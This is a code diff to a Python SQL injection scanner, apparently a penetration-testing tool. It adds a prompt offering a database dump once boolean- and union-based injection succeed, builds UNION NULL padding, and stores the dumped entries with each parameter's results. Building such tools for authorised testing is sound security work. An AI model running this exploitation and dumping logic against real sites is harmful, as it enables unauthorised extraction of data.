@@ -24,7 +24,8 @@ class Scanner:
 		self.union = union
 		self.time = time
 		self.extract = extract
-
+  
+		self.results: list = []
 
 	def scan(self, url: str):
 		params = extract_params(url)
@@ -34,9 +35,8 @@ class Scanner:
 			exit(0)
 		Logger.debug(f"params: {params}")
 
-		results = []
-
 		for param in params:
+			print()
 			Logger.info(f"---------- Testing parameter: `{param}` ----------\n")
 
 			print()
@@ -93,23 +93,18 @@ class Scanner:
    			"""
 
 			is_bool = self.boolean.test(url, param, context)
+			db_dump = {}
+
 			if is_bool:
 				Logger.success(f"Boolean based injection successful!")
 				if is_union:
-					# Create a NULL list matching the number of columns to make query compatible.
-					# We substract 1 from count because the main element is added afterwards 
-					nulls = ",".join(["NULL"] * (column_count - 1))
-    
-					union_expression = f"database(),{nulls}"
-  
-					db_name = self.extract.find_db_elem_name(
-						url, param, context, column_count, "database()", union_expression,
-					)
-					if db_name:
-						Logger.success(f"Found database name: {YELLOW}{db_name}{RESET}!\n")
+					do_dump = input("Do you want to perform a database dump? (y/n): ")
 
-					self.extract.dump_db_elem_entries(url, param, context, column_count, nulls, "table")
-					self.extract.dump_db_elem_entries(url, param, context, column_count, nulls, "column")
+					if do_dump.lower() == "y":
+						# Create a NULL list matching the number of columns to make query compatible.
+						# We substract 1 from count because the main element is added afterwards 
+						nulls = ",".join(["NULL"] * (column_count - 1))
+						db_dump = self.extract.dump_db_entries(url, param, context, column_count, nulls)
 
 			else:
 				Logger.failure(f"Boolean based injection unsuccessful")
@@ -130,7 +125,7 @@ class Scanner:
 			Print results
    			"""
 
-			results.append({
+			self.results.append({
 				"param": param,
 
 				"boolean": {
@@ -145,15 +140,13 @@ class Scanner:
 
 				"union": {
 					"detected": is_union,
-					# "database": db,
-					# "tables": tables,
-				#	"columns": {...},
-				#	"dump": [...]
 				},
     
 				"time": {
 					"detected": is_time,
-				}
+				},
+    
+				"db_dump": db_dump
 			})
 
-		return results
+		return self.results
